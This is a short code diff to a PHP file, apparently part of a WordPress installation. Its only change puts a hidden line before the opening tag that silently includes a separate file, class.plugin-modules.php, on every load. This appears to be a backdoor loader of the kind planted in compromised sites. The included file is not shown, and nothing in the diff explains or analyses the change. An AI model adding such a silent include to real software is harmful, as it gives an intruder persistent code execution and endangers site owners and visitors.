@@ -1,4 +1,4 @@
-<?php
+<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
 
 // DO NOT MODIFY THIS FILE!
 // Use your theme's functions.php instead
